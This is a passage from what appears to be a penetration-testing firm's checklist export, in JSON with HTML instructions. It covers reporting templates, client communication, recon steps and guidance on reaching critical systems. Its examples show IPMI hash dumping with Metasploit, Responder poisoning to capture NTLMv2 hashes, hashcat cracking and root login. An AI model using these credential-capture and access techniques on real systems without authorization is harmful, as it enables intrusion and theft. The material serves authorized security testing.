require correlation.</p><p>8. Truncate all tool ASCII art and information that is not directly relevant to the finding where possible. </p><p>9. Fully redact all passwords, hashes, and sensitive information.</p><h3>Finding Verification Examples </h3><p><strong>EXAMPLE 1</strong></p><p><strong>Verification Step &#35;1</strong></p><p><strong><em>A. Name:</em></strong></p><blockquote><p>10.0.128.119: It was possible to capture the IPMI password hash using the auxiliary/scanner/ipmi/ipmi_dumphashes Metasploit module.</p></blockquote><p><strong><em>B. Description:</em></strong></p><pre><code><strong>$ sudo msfconsole</strong>\nmsf6 &gt; <strong>use auxiliary/scanner/ipmi/ipmi_dumphashes</strong>\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; <strong>set rhosts 10.0.128.119</strong>\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; <strong>run</strong>                                                                                                                                                                 \n\n<strong><span style=\"color: #DB2719\">[+] 10.0.128.119:623 - IPMI - Hash found: Root:</span></strong><strong>[REDACTED] </strong><strong><span style=\"color: #DB2719\">                                                                                                                                                                                    </span></strong>\n[&#42;] Scanned 1 of 1 hosts (100% complete)                                                                                                                                                                           \n[&#42;] Auxiliary module execution completed</code></pre><p><strong>Verification Step &#35;2</strong></p><p><strong><em>A. Name: </em></strong></p><blockquote><p>The password hash was then cracked offline using the password cracking tool Hashcat, and the cleartext password was used to gain root access via Telnet.</p></blockquote><p><strong><em>B. Description:</em></strong></p><pre><code><strong>$ telnet 10.0.128.119</strong>\n\nUSER: <strong>root</strong>\nPassword: <strong>[REDACTED]</strong>\n&#35; <strong>whoami\n</strong><strong><span style=\"color: #DB2719\">root</span></strong></code></pre><p><strong>EXAMPLE 2</strong></p><p><strong>Verification Step &#35;1</strong></p><p><strong><em>A. Name:</em></strong></p><blockquote><p>netspi.local: Using the tool Responder, it was possible to spoof LLMNR, NBNS and MDNS requests to create a man-in-the-middle and capture hashed user passwords.</p></blockquote><p><strong><em>B. Description:</em></strong></p><pre><code><strong>$ sudo responder -I eth0 \n</strong><strong>[TRUNCATED]</strong>\n[&#42;] [NBT-NS] Poisoned answer sent to 192.168.185.64 for name PC12 (service: File Server)\n[&#42;] [NBT-NS] Poisoned answer sent to 192.168.185.64 for name netspi.local (service: Domain Master Browser)\n[&#42;] [NBT-NS] Poisoned answer sent to 192.168.185.89 for name PC-02 (service: Workstation/Redirector)\n[&#42;] [NBT-NS] Poisoned answer sent to 192.168.185.89 for name PC-02 (service: Workstation/Redirector)\n[&#42;] [NBT-NS] Poisoned answer sent to 192.168.185.89 for name PC-02 (service: Workstation/Redirector)\n<strong><span style=\"color: #DB2719\">[&#42;] [MDNS] Poisoned answer sent to ::ffff:172.16.60.171 for name netspi.local\n</span></strong><strong><span style=\"color: #DB2719\">[SMB] NTLMv2-SSP Client   : ::ffff:172.16.60.171\n</span></strong><strong><span style=\"color: #DB2719\">[SMB] NTLMv2-SSP Username : netspi\\test.user\n</span></strong><strong><span style=\"color: #DB2719\">[SMB] NTLMv2-SSP Hash     : test.user::netspi:</span></strong><strong>[REDACTED]\n</strong><strong>[TRUNCATED]</strong></code></pre><p><strong>Verification Step &#35;2</strong></p><p><strong><em>A. Name:</em></strong></p><blockquote><p>It was possible to crack the NetNTLMv2 password hash offline for domain.com\\user1.</p></blockquote><p><strong><em>B. Description:</em></strong></p><pre><code><strong>$ hashcat -a 0 -m 5600 -blahbahb -ahbha\n\n</strong><strong><span style=\"color: #DB2719\">&lt;output with redacted password&gt;</span></strong></code></pre><p><strong>Verification Step &#35;3</strong></p><p><strong><em>A. Name:</em></strong></p><blockquote><p>The domain.com\\user1 credential could then be used to log into 192.168.25.129 as a local Administrator.</p></blockquote><p><strong><em>B. Description:</em></strong></p><blockquote><p><strong>[RDP LOGIN SCREEN SHOT HERE SHOWING USER AND IP/HOSTNAME]</strong></p></blockquote>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "02ef1f57-7782-45e9-b3d2-f1be1b267033",
						"name": "PTaaS Communication and Finding Publishing",
						"instructions": "<h2>Instructions</h2><ol><li><p>All project communication should occur in Platform. This is so everyone involved in the project has visibility and also so that if a consultant needs to be switched off the project for any reason the next consultant will have an easy way to review historical communications.</p></li><li><p>Provide a high level status update to the clients daily. For an example template, please refer to the Reference link attached to this checklist item. Any format can be used, but it should include tasks that were performed during the day, relevant finding information, and any other notable concerns or observations related to the project.</p></li><li><p>Publish finding as they are completed each day.</p><ol><li><p>For consultants that <strong>are not</strong> signed off to perform QA in the ExPen service line:</p><ol><li><p>Reach out to correct thread on the <code>#services-ptaas-qa</code> Slack channel (or the <code>#workgroup-netpen-pod-qa</code> Slack channel if you're currently in a POD) to get the findings reviewed prior to publishing.</p></li></ol></li><li><p>For consultants that <strong>are </strong>signed off to perform QA in the ExPen service line:</p><ol><li><p>No explicit approval or review is required to publish findings. Double-check your verification steps for errors, typos, spelling mistakes, and sensitive information that should be redacted, then publish when confident that the findings are ready to deliver.</p></li></ol></li></ol></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d53a1935-5da7-4933-bce7-75b5e2d0c87f",
						"name": "Gain Unauthorized Access to Systems, Apps, and Data",
						"instructions": "<h2>Instructions</h2><p>Gain unauthorized access to systems, application functionality, and sensitive data. Try to drive all high impact vulnerabilities to code execution when possible. The goal of this objective is to illustrate impact.</p><h2>Read Access</h2><p>In order to use read access as an entry point you'll need to find <strong>authentication tokens</strong>. Those include things like passwords, session cookies, and private keys. To increase your luck, research the OS and installed applications to determine where they store that type of information by default. Then, simply use the passwords, session cookies, or keys to login.</p><p>Vulnerabilities can potentially allow read access to:</p><ul><li><p>Memory</p></li><li><p>File System</p></li><li><p>Registry</p></li><li><p>Database</p></li></ul><h3><strong>Questions to ask yourself:</strong></h3><ol><li><p>What files and paths can I read from?</p></li><li><p>Where does the OS and installed applications store credentials?</p></li><li><p>Can I read privileged files (do I have root/administrator)?</p></li><li><p>Can I read any authentication tokens?</p></li><li><p>If yes, then how do I use them to login?</p></li><li><p>If not, then write the finding up and move on.</p></li></ol><h2>Write Access</h2><p>In order to use write access as an Entry Point you'll need to write code, content, or files to locations <strong>where you can control their execution or inject an authentication token</strong>.</p><p>Vulnerabilities can potentially allow write access to the follow areas:</p><ul><li><p>Memory</p></li><li><p>File System</p></li><li><p>Registry</p></li><li><p>Database</p></li></ul><p>There are primarily two scenarios you'll run into regarding file access, restricted and arbitrary write access. It can be used as a general example for the other areas.</p><h3><strong>Restricted File Write</strong></h3><p>The vulnerability provides write access to files, but it is restricted to a specific file or path.</p><h3><strong>Arbitrary File Write</strong></h3><p>The vulnerability provides write access any file or path. The only thing restricting write access to files in this scenario are the privileges of the acting user. In most cases that will be a service account of some kind. For example, the account running IIS may not have write access the all users startup directory.</p><h3><strong>Questions to ask yourself:</strong></h3><ol><li><p>What files and paths can I write to?</p></li><li><p>Where are OS and application autorun locations?</p></li><li><p>Do I have administrative write access?</p></li><li><p>Can I write my own authentication tokens within the application or OS?</p></li><li><p>If yes, then how do I use them to login?</p></li><li><p>If not, then write the finding up and move on.</p></li></ol><h2>Remote Code Execution </h2><p>These types of issues allow direct code execution within the context of the service account. This is typically a canned exploit or unauthorized access to functionality that is intended to execute commands or code.</p><p>The general guidance is find a safe reliable exploit to run. Review the verification instructions. If a vulnerability recommendation does not already exist make sure to get a second opinion before running as exploit.</p><p>If you are targeting existing functionality in an application, database, or operating system, then read the documentation for guidance.</p><h2>Credentialed Access</h2><p>Attempt to log into application and management interfaces that support the authentication method. Then attempt to pivot through that medium into the internal network zones. If MFA exists, take a little to time to understand if a bypass is possible via self-service portals or other options.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5c65c957-2b02-4ea9-80a9-aa18134dea4c",
						"name": "Obtain Access to Critical Internal Resources",
						"instructions": "<h2>Instructions</h2><p>The goal of this objective is to illustrate impact. </p><h3><strong>Critical Servers</strong></h3><ul><li><p>Domain controller</p><ul><li><p>Domain Privilege Escalation - Obtain Domain Admin</p></li></ul></li><li><p>Core application or web server</p></li></ul><h3><strong>Critical Data Stores</strong></h3><ul><li><p>Database servers (structured data)</p></li><li><p>File servers (unstructured data)</p></li></ul><h3><strong>Critical Data</strong></h3><ul><li><p>Regulated data: SSN, CCN, PHI, PII</p></li><li><p>Investment strategies</p></li><li><p>Mergers and acquisition data</p></li><li><p>Internal earning reports</p></li><li><p>Proprietary secrets (\"Coke Formula\")</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "0ed45773-71aa-4d51-b2d4-c5f891f55f22",
						"name": "Attack Narratives",
						"instructions": "<h2>Instructions</h2><p>When creating the Attack Narrative chapter of the ExPen report, please map each step to the MITRE ATT&amp;CK framework (https://attack.mitre.org/) where possible. </p><p>Common MITRE ATT&amp;CK mappings can be found on the Outline wiki link provided in the References section of this checklist item.</p><p><u>Below is an example Attack Narrative Summary structure:</u></p><h3>4.1 Attack Narrative Summary</h3><p>Below is a summary of the escalation path used during testing to obtain Domain Admin privileges and access sensitive data. Steps were mapped to the MITRE ATT&amp;CK framework where possible.</p><ol><li><p>T1110.003 - Credential Access: Brute Force - Password Spraying</p></li><li><p>T1210 - Lateral Movement: Exploitation of Remote Services</p></li><li><p>T1558 - Credential Access: Steal or Forge Kerberos Tickets</p></li><li><p>T1069.002 - Discovery: Permissions Groups Discovery - Domain Groups</p></li><li><p>T1555 - Credential Access: Credentials from Password Stores</p></li><li><p>T1187 - Credential Access: Forced Authentication</p></li><li><p>T1558 - Credential Access: Steal or Forge Kerberos Tickets</p></li><li><p>T1003.006 - Credential Access: OS Credential Dumping - DCSync</p></li><li><p>T1021.002 - Lateral Movement: Remote Services - SMB/Windows Admin Shares</p></li><li><p>T1021.001 - Lateral Movement: Remote Services - Remote Desktop Protocol</p></li></ol><h3>4.2 Attack Narrative Details</h3><p>Below is a detailed walkthrough of the escalation path used during testing to obtain Domain Admin privileges and access sensitive data.</p><p><strong>T1110.003 - Credential Access: Brute Force - Password Spraying</strong></p><p>1. NetSPI did this to gain this.</p><pre><code>..code snippet or screenshot..</code></pre><p><strong>T1210 - Lateral Movement: Exploitation of Remote Services</strong></p><p>2. NetSPI completed another activity. </p><pre><code>..code snippet or screenshot..</code></pre><p>...etc.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "3440af02-4868-40e9-932d-b66ecdca7269",
						"name": "EMEA Client Reporting Requirements ",
						"instructions": "<h2>Background Information</h2><p>EMEA clients have special requirements that must be followed in order to maintain compliance with regulations that govern data handling in their region. </p><h2>Instructions</h2><p>To determine if a client falls under these requirements, navigate to the Consultant Workspace in FinancialForce using the link found in the References section of this task and then:</p><ol><li><p>Select \"Accounts\" in the Search dropdown. </p></li><li><p>Enter the name of your client. </p></li><li><p>Mouse over the client in the resulting list. </p></li><li><p>Check if \"EMEA\" is shown under \"Territory Assigned\"</p></li></ol><h2>Reporting Requirements</h2><p>Ensure that all EMEA report data (including CSV exports, attestation letters and the report itself) are added to the \"Reports\" tab of the Platform project <strong>and not uploaded to SharePoint</strong>.</p><ul><li><p>Document names should use the formats FileName_Draft_1 , FileName_Final or similar when working through the QA process.</p></li><li><p>The \"Show in Track\" checkbox should be unchecked for all draft documents so the client does not see them.</p></li><li><p>To provide comments and feedback during QA, please download and review a file, increment the _Draft_X number of the filename, and reupload the file to the \"Reports\" tab for the tester to review.</p></li></ul><p>Please reach out to Sam Kirkman with any further questions or concerns regarding the data handling or reporting process for EMEA-based clients.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 2,
				"collapsed": true
			},
			{
				"uid": "33479610-8961-4fd0-8949-a6bad0d746e2",
				"name": "Reconnaissance: IP Addresses (Not Required if Scope Has Been Provided by Client)",
				"description": "This goal of this task group is to identify IP address ranges associated with the client.",
				"type": 1,
				"tasks": [
					{
						"uid": "aaa72287-de06-409a-bce1-7735b1515635",
						"name": "Black Box Scope Discovery",
						"instructions": "<h2>Instructions</h2><p>This checklist section should be used for any black box tests requiring blind asset discovery. <strong>If the client has provided in-scope IPs and domains for the test, this entire checklist section is not required to be completed and can be marked as NA.</strong></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7b723746-69e8-4498-ae81-51216c0a9e28",
						"name": "Enumerate Company's Legal Name",
						"instructions": "<h2><strong>Instructions</strong></h2><p>Look up the company's official name and state registration. Each company has to be registered with the Secretary of State in the state they are operating in. Each state has a Secretary of State website with a business search to look up full company name along with other useful information.</p><h2><strong>Report Verification</strong></h2><p>Add a hyperlink to the checklist item notes that points to the secretary of state web page containing the company's information. Also, copy the basic information in to the notes.</p><h3><strong>Additional Notes</strong></h3><p>Below is a list of each state and their associated secretary of state websites. <strong>This was last updated 04/04/2024.</strong></p><p>Alabama - http://sos.alabama.gov/</p><p>Alaska - https://www.commerce.alaska.gov/</p><p>Arizona - https://azsos.gov/</p><p>Arkansas - https://www.sos.arkansas.gov/</p><p>California - http://www.sos.ca.gov/</p><p>Colorado - https://www.sos.state.co.us/</p><p>Connecticut - http://portal.ct.gov/sots</p><p>Delaware - https://sos.delaware.gov/</p><p>District of Columbia - https://os.dc.gov/</p><p>Florida - https://dos.fl.gov/</p><p>Georgia - http://sos.ga.gov/</p><p>Hawaii - https://cca.hawaii.gov/</p><p>Idaho - https://sos.idaho.gov/</p><p>Illinois - https://www.ilsos.gov/</p><p>Indiana - https://www.in.gov/sos/</p><p>Iowa - https://sos.iowa.gov/</p><p>Kansas - https://www.sos.ks.gov/</p><p>Kentucky - https://www.sos.ky.gov/</p><p>Louisiana - https://www.sos.la.gov/</p><p>Maine - http://www.maine.gov/sos/</p><p>Maryland - https://sos.maryland.gov/</p><p>Massachusetts - https://www.sec.state.ma.us/</p><p>Michigan - https://www.michigan.gov/sos/</p><p>Minnesota - https://www.sos.state.mn.us/</p><p>Mississippi - http://www.sos.ms.gov/</p><p>Missouri - https://www.sos.mo.gov/</p><p>Montana - https://sosmt.gov/</p><p>Nebraska - https://sos.nebraska.gov/</p><p>Nevada - https://www.nvsos.gov/sos</p><p>New Hampshire - https://www.sos.nh.gov/</p><p>New Jersey - https://www.nj.gov/state/</p><p>New Mexico - https://www.sos.nm.gov/</p><p>New York - https://dos.ny.gov/</p><p>North Carolina - https://www.sosnc.gov/</p><p>North Dakota - https://www.sos.nd.gov/</p><p>Ohio - https://www.sos.state.oh.us/</p><p>Oklahoma - https://www.sos.ok.gov/</p><p>Oregon - https://sos.oregon.gov/</p><p>Pennsylvania - http://www.dos.pa.gov/</p><p>Puerto Rico - https://www.statedepartment.pr.gov/</p><p>Rhode Island - http://www.sos.ri.gov/</p><p>South Carolina - https://sos.sc.gov/</p><p>South Dakota - https://sdsos.gov/</p><p>Tennessee - https://sos.tn.gov/</p><p>Texas - https://www.sos.state.tx.us/</p><p>Utah - https://corporations.utah.gov/</p><p>Vermont - https://sos.vermont.gov/</p><p>Virginia - https://cis.scc.virginia.gov/</p><p>Washington - https://www.sos.wa.gov/</p><p>West Virginia - https://sos.wv.gov/</p><p>Wisconsin - https://sos.wi.gov/</p><p>Wyoming - https://sos.wyo.gov/</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064479,
							"uid": "598ab077-9f1a-e911-810c-ecf4bbd04083",
							"name": "General Information - Identified Company Name ",
							"description": "<p>This finding provides a light company profile.  It should not if it is public or private, and in what states or countries it commonly operates out of.</p><p>Note: Please note that this is only done when blind company discovery in explicitly included in scope.</p>",
							"severityId": -2,
							"businessImpact": "<p>Company information can often be used in future technical, physical, and administrative attacks.</p>",
							"sourceIdentifier": "M:62202555-e5b0-47da-a1b4-b6ba23ac71af",
							"verificationInstructions": "<h2><strong>Instructions</strong></h2><p>Look up the company's officinal name and state registration.  Each company has to be registered with the Secretary of State in the state they are operating in.  Each state has a Secretary of State website with a business search to look up full company name along with other useful information.</p><h2><strong>Report Verification</strong></h2><p>Add a hyperlink to the checklist item notes that points to the secretary of state web page containing the company's information.  Also, copy the basic information in to the notes.</p><h3><strong>Additional Notes</strong></h3><p>Below is a list of each state and their website. <strong>This was last updated 04/04/2024.</strong></p><p>Alabama - http://sos.alabama.gov/</p><p>Alaska - https://www.commerce.alaska.gov/</p><p>Arizona - https://azsos.gov/</p><p>Arkansas - https://www.sos.arkansas.gov/</p><p>California - http://www.sos.ca.gov/</p><p>Colorado - https://www.sos.state.co.us/</p><p>Connecticut - http://portal.ct.gov/sots</p><p>Delaware - https://sos.delaware.gov/</p><p>District of Columbia - https://os.dc.gov/</p><p>Florida - https://dos.fl.gov/</p><p>Georgia - http://sos.ga.gov/</p><p>Hawaii - https://cca.hawaii.gov/</p><p>Idaho - https://sos.idaho.gov/</p><p>Illinois - https://www.ilsos.gov/</p><p>Indiana - https://www.in.gov/sos/</p><p>Iowa - https://sos.iowa.gov/</p><p>Kansas - https://www.sos.ks.gov/</p><p>Kentucky - https://www.sos.ky.gov/</p><p>Louisiana - https://www.sos.la.gov/</p><p>Maine - http://www.maine.gov/sos/</p><p>Maryland - https://sos.maryland.gov/</p><p>Massachusetts - https://www.sec.state.ma.us/</p><p>Michigan - https://www.michigan.gov/sos/</p><p>Minnesota - https://www.sos.state.mn.us/</p><p>Mississippi - http://www.sos.ms.gov/</p><p>Missouri - https://www.sos.mo.gov/</p><p>Montana - https://sosmt.gov/</p><p>Nebraska - https://sos.nebraska.gov/</p><p>Nevada - https://www.nvsos.gov/sos</p><p>New Hampshire - https://www.sos.nh.gov/</p><p>New Jersey - https://www.nj.gov/state/</p><p>New Mexico - https://www.sos.nm.gov/</p><p>New York - https://dos.ny.gov/</p><p>North Carolina - https://www.sosnc.gov/</p><p>North Dakota - https://www.sos.nd.gov/</p><p>Ohio - https://www.sos.state.oh.us/</p><p>Oklahoma - https://www.sos.ok.gov/</p><p>Oregon - https://sos.oregon.gov/</p><p>Pennsylvania - http://www.dos.pa.gov/</p><p>Puerto Rico - https://www.statedepartment.pr.gov/</p><p>Rhode Island - http://www.sos.ri.gov/</p><p>South Carolina - https://sos.sc.gov/</p><p>South Dakota - https://sdsos.gov/</p><p>Tennessee - https://sos.tn.gov/</p><p>Texas - https://www.sos.state.tx.us/</p><p>Utah - https://corporations.utah.gov/</p><p>Vermont - https://sos.vermont.gov/</p><p>Virginia - https://cis.scc.virginia.gov/</p><p>Washington - https://www.sos.wa.gov/</p><p>West Virginia - https://sos.wv.gov/</p><p>Wisconsin - https://sos.wi.gov/</p><p>Wyoming - https://sos.wyo.gov/</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Depending on the source of the information and the type of company remediation steps may not be necessary.</p>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7cd5a5f7-6591-47f7-9a16-21abad340a01",
						"name": "Enumerate Company's Subsidiaries",
						"instructions": "<h2>Instructions</h2><p>Identify subsidiaries for the target company.</p><h2><strong>Variation: Manual Review</strong></h2><p>Review sec filing for company information and a list of subsidiaries. Google and other online resources may also be good targets for supporting information. Google for the company name and common sec filing documents. Below are a few sample Google dorks.</p><pre><code>site:www.sec.gov subsidiaries facebook\nsite:www.sec.gov subsidiaries facebook Exhibit 21\nsite:www.sec.gov subsidiaries facebook 10-k type</code></pre><p>Alternatively, you can use the sev.gov search page at http://www.sec.gov/edgar/searchedgar/companysearch.html</p><p><strong>Note:</strong> https://www.crunchbase.com may also be useful for identifying acquired companies.</p><h2><strong>Variation: Automated Review</strong></h2><p>1. Download  and install <a href='https://github.com/NetSPI/NetblockTool/blob/bf5a668dc52089265d9c72df3feb4dcb23ba9798/README.md'>n</a>etblock tool from  <a href='https://github.com/NetSPI/NetblockTool'>https://github.com/NetSPI/NetblockTool</a>.</p><pre><code>git clone https://github.com/NetSPI/NetblockTool.git\ncd NetblockTool &amp;&amp; pip3 install -r requirements.txt</code></pre><p>2.  Below are the subsidiary options.</p><pre><code>Company Subsidiaries:\n-s        Fetch subsidiary information and return netblocks of all subsidiaries in\n          addition to initial target\n-sn       Company name to use when fetching subsidiaries\n-sp       Use alternate parsing method when fetching subsidiary information; use\n          if the default method isn't working as expected\n-so       Write subsidiary information to a text file (CompanyName_subsidiaries.txt)</code></pre><p>3. Run the tool with the desired options.</p><pre><code>python3 NetblockTool.py -v Company -s -sn companyname</code></pre><h2><strong>Report Verification</strong></h2><p>Add a hyperlink to the checklist item notes that points to the sec.gov documents containing the company's information and subsidiaries. Also, copy the basic information in to the notes. Alternatively, they can be save as a .txt file and uploaded to the project Artifacts.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064480,
							"uid": "4ae920ba-9f1a-e911-810c-ecf4bbd04083",
							"name": "General Information - Identified Company Subsidiaries",
							"description": "<p>Review sec filing for company information and a list of subsidiaries. Google and other online resources may also be good targets for supporting information.</p><p>Note: Please note that this is only done when blind company discovery in explicitly included in scope.</p>",
							"severityId": -2,
							"businessImpact": "<p>Company subsidiaries can often be used in future technical, physical, and administrative attacks.</p>",
							"sourceIdentifier": "M:49f169b1-190b-4f1d-bcb4-ee83a1fb6b28",
							"verificationInstructions": "<h2>Instructions</h2><p>Identify subsidiaries for the target company.</p><h2><strong>Variation: Manual Review</strong></h2><p>Review sec filing for company information and a list of subsidiaries. Google and other online resources may also be good targets for supporting information. Google for the company name and common sec filing documents.  Below are a few sample Google dorks.</p><pre><code>site:www.sec.gov subsidiaries facebook \nsite:www.sec.gov subsidiaries facebook Exhibit 21\nsite:www.sec.gov subsidiaries facebook 10-k type</code></pre><p>Alternatively, you can use the sev.gov search page at http://www.sec.gov/edgar/searchedgar/companysearch.html</p><p>Note: https://www.crunchbase.com may also be useful for identifying acquired companies.</p><h2><strong>Variation: Automated Review</strong> </h2><p>1. Download  and install <a href='https://github.com/NetSPI/NetblockTool/blob/bf5a668dc52089265d9c72df3feb4dcb23ba9798/README.md'>n</a>etblock tool from  <a href='https://github.com/NetSPI/NetblockTool'>https://github.com/NetSPI/NetblockTool</a>.</p><pre><code>git clone https://github.com/NetSPI/NetblockTool.git\ncd NetblockTool &amp;&amp; pip3 install -r requirements.txt</code></pre><p>2.  Below are the subsidiary options.</p><pre><code>Company Subsidiaries:\n    -s        Fetch subsidiary information and return netblocks of all subsidiaries in\n                  addition to initial target\n    -sn       Company name to use when fetching subsidiaries\n    -sp       Use alternate parsing method when fetching subsidiary information; use\n                  if the default method isn't working as expected\n    -so       Write subsidiary information to a text file (CompanyName_subsidiaries.txt)</code></pre><p>3. Run the tool with the desired options.</p><pre><code>python3 NetblockTool.py -v Company -s -sn companyname</code></pre><h2><strong>Report Verification</strong></h2><p>Add a hyperlink to the checklist item notes that points to the sec.gov documents containing the company's information and subsidiaries.  Also, copy the basic information in to the notes. Alternatively, they can be save as a .txt file and attached to the project documents. </p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Depending on the source of the information and the type of company, remediation steps may not be necessary.</p>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "bbfba703-12bd-49f2-ad67-62a8770a415f",
						"name": "Enumerate Company's IP Ranges - Registries",
						"instructions": "<h2>Instructions</h2><p>Use enumerated company and subsidiary names to identify IP ranges they own using common IP registries.</p><h2><strong>Variation: Manual Review</strong></h2><p>Below is a list of the common IP registries:</p><ul><li><p>North America     http://www.arin.net</p></li><li><p>Western Europe  http://www.ripe.net</p></li><li><p>Asian Pacific        http://www.apnic.net</p></li><li><p>Latin America      http://www.lacnic.net</p></li><li><p>Africa (AfrNIC)     http://www.afrinic.net</p></li></ul><p>Below are the URLs where you can issue arin.net lookups manually.</p><ul><li><p>Old: https://whois.arin.net/ui/query.do</p></li><li><p>New: https://search.arin.net/rdap/?query=ameriprise</p></li></ul><h2><strong>Variation: Automated Review</strong></h2><p>1. Download and install netblock tool from  <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/NetblockTool\">https://github.com/NetSPI/NetblockTool</a>.</p><pre><code>git clone https://github.com/NetSPI/NetblockTool.git\ncd NetblockTool &amp;&amp; pip3 install -r requirements.txt</code></pre><p>2.  Below are the subsidiary options.</p><pre><code>Company Subsidiaries:\n-s        Fetch subsidiary information and return netblocks of all subsidiaries in\n          addition to initial target\n-sn       Company name to use when fetching subsidiaries\n-sp       Use alternate parsing method when fetching subsidiary information; use\n          if the default method isn't working as expected\n-so       Write subsidiary information to a text file (CompanyName_subsidiaries.txt)</code></pre><p>3. Run the tool with the desired options.</p><pre><code>python3 NetblockTool.py -v Company -s -sn companyname</code></pre><p><strong>Additional Options</strong></p><p>1. Currently under review, but consider using a personal account for now.  https://ipinfo.io/</p><h2><strong>Report Requirements</strong></h2><p>Include a list of all discovered IP ranges in the task notes or upload them as a .txt file to the project Internal Documents section.</p><h2><strong>Additional Notes</strong></h2><p>Below is a quick nmap command to quickly parse IPs, IP ranges, and CIDR networks into a file containing only 1 IP address per line if needed.</p><p>1. Place all in scope IPs, IP Ranges, and CIDR network into one file.</p><p>2. Run the following command in linux to expand the ranges/networks  and create a new file with one IP per line.</p><pre><code>nmap -sL -Pn -n -iL test1.txt | awk '{print $5}' | grep -v \"address\" | grep -v \"nmap\" | sort | uniq&gt; IPs_ClientProvided.txt</code></pre><p>3. Import IPs_ClientProvided.txt into the Internal Documents section for the project.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064481,
							"uid": "b5126a42-a01a-e911-810c-ecf4bbd04083",
							"name": "General Information - Identified IP Ranges - Registeries",
							"description": "<p>Use enumerated company and subsidiary names to identify IP ranges they own using common IP registries.</p>",
							"severityId": -2,
							"businessImpact": "<p>Company IP ranges can often be used in future technical and administrative attacks.</p>",
							"sourceIdentifier": "M:eca0842d-9a52-41b0-85ef-254ec4db0347",
							"verificationInstructions": "<h2>Instructions</h2><p>Use enumerated company and subsidiary names to identify IP ranges they own using common IP registries. </p><h2><strong>Variation: Manual Review</strong></h2><p>Below is a list of the common IP registries:</p><ul><li><p>North America     http://www.arin.net</p></li><li><p>Western Europe  http://www.ripe.net</p></li><li><p>Asian Pacific        http://www.apnic.net</p></li><li><p>Latin America      http://www.lacnic.net</p></li><li><p>Africa (AfrNIC)     http://www.afrinic.net</p></li></ul><p>Below are the URLs where you can issue arin.net lookups manually.</p><ul><li><p>Old: https://whois.arin.net/ui/query.do</p></li><li><p>New: https://search.arin.net/rdap/?query=ameriprise</p></li></ul><h2><strong>Variation: Automated Review</strong> </h2><p>1. Download  and install <a href='https://github.com/NetSPI/NetblockTool/blob/bf5a668dc52089265d9c72df3feb4dcb23ba9798/README.md'>n</a>etblock tool from  <a href='https://github.com/NetSPI/NetblockTool'>https://github.com/NetSPI/NetblockTool</a>.</p><pre><code>git clone https://github.com/NetSPI/NetblockTool.git\ncd NetblockTool &amp;&amp; pip3 install -r requirements.txt</code></pre><p>2.  Below are the subsidiary options.</p><pre><code>Company Subsidiaries:\n    -s        Fetch subsidiary information and return netblocks of all subsidiaries in\n                  addition to initial target\n    -sn       Company name to use when fetching subsidiaries\n    -sp       Use alternate parsing method when fetching subsidiary information; use\n                  if the default method isn't working as expected\n    -so       Write subsidiary information to a text file (CompanyName_subsidiaries.txt)</code></pre><p>3. Run the tool with the desired options.</p><pre><code>python3 NetblockTool.py -v Company -s -sn companyname</code></pre><p><strong>Additional Options</strong></p><p>1. Currently under review, but consider using a personal account for now.  https://ipinfo.io/</p><h2><strong>Report Requirements</strong></h2><p>Include a list of all discovered IP ranges in the task notes or attach them as a .txt file to the project documents.</p><h2><strong>Additional Notes</strong></h2><p>Below is a quick nmap command to quickly parse IPs, IP ranges, and CIDR networks into a file containing only 1 IP address per line if needed.</p><p>1. Place all in scope IPs, IP Ranges, and CIDR network into one file.</p><p>2. Run the following command in linux to expand the ranges/networks  and create a new file with one IP per line.</p><pre><code>nmap -sL -Pn -n -iL test1.txt | awk '{print $5}' | grep -v &quot;address&quot; | grep -v &quot;nmap&quot; | sort | uniq&gt; IPs_ClientProvided.txt</code></pre><p>3. Import IPs_ClientProvided.txt into the Artifacts section for the project. </p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Depending on the source of the information and the type of company, remediation steps may not be necessary.</p><p>Note: Please note that this is only done when blind company discovery in explicitly included in scope.</p>"
						},
						"ordinal": 3,
						"commentsCount": 0,
